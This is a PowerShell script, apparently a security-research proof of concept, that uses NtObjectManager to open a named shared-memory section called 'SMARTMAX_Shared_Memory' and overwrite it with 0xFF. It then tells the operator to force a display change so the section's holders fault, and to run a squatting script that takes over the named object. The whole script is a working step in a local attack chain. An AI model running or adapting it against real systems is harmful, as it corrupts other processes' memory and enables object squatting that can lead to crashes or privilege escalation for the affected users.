[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Position = 0)]
    [string]$Name
)

Import-Module NtObjectManager -ErrorAction Stop

if (-not $PSBoundParameters.ContainsKey('Name')) {
    $session = (Get-NtProcess -Current).SessionId
    $Name = "\Sessions\$session\BaseNamedObjects\SMARTMAX_Shared_Memory"
}
$Path = $Name

# Split the full path into parent directory and leaf.
$idx = $Path.LastIndexOf('\')
if ($idx -lt 1) {
    Write-Error "Invalid object path '$Path' (expected a full NT path like '\Sessions\1\BaseNamedObjects\Name')."
    return
}
$ParentPath = $Path.Substring(0, $idx)
$Leaf = $Path.Substring($idx + 1)

function Test-LeafPresent {
    param([string]$Parent, [string]$LeafName)
    $dir = $null
    try {
        $dir = Get-NtDirectory $Parent -ErrorAction Stop
    }
    catch {
        return $false
    }
    try {
        return [bool]($dir.Query() | Where-Object { $_.Name -eq $LeafName })
    }
    finally {
        $dir.Close()
    }
}

# Corrupt section.
if (-not (Test-LeafPresent -Parent $ParentPath -LeafName $Leaf)) {
    Write-Host "Object '$Path' does not exist; nothing to corrupt." -ForegroundColor Yellow
    return
}

Write-Verbose "Object '$Path' exists; opening for corruption."
try {
    $section = Get-NtSection $Path -Access MapRead, MapWrite -ErrorAction Stop
}
catch [NtCoreLib.NtException] {
    switch ($_.Exception.Status) {
        'STATUS_ACCESS_DENIED' {
            Write-Error "Access denied opening '$Path' for write. Try an elevated session."
        }
        'STATUS_OBJECT_TYPE_MISMATCH' {
            Write-Error "'$Path' exists but is not a Section object; refusing to continue."
        }
        'STATUS_OBJECT_NAME_NOT_FOUND' {
            Write-Host "'$Path' vanished before it could be opened; already gone." -ForegroundColor Yellow
        }
        default {
            Write-Error "Failed to open '$Path': $($_.Exception.Message)"
        }
    }
    return
}

$map = $null
$corrupted = $false
try {
    $map = $section.MapReadWrite()
    if ($PSCmdlet.ShouldProcess($Path, "memset $($map.Length) bytes to 0xFF")) {
        $map.FillBuffer(0xFF)
        $corrupted = $true
        Write-Verbose "Filled $($map.Length) bytes of '$Path' with 0xFF."
    }
}
catch [NtCoreLib.NtException] {
    Write-Error "Mapping/writing '$Path' failed: $($_.Exception.Message)"
    return
}
finally {
    if ($map) { $map.Dispose() }
    $section.Close()
}

if ($corrupted) {
    Write-Host "'$Path' view poisoned with 0xFF. Trigger a display change (Toggle-RefreshRate.ps1 / Reset-DisplayMode.ps1) to force the holders to fault, then run Squat-NamedObject.ps1." -ForegroundColor Green
}
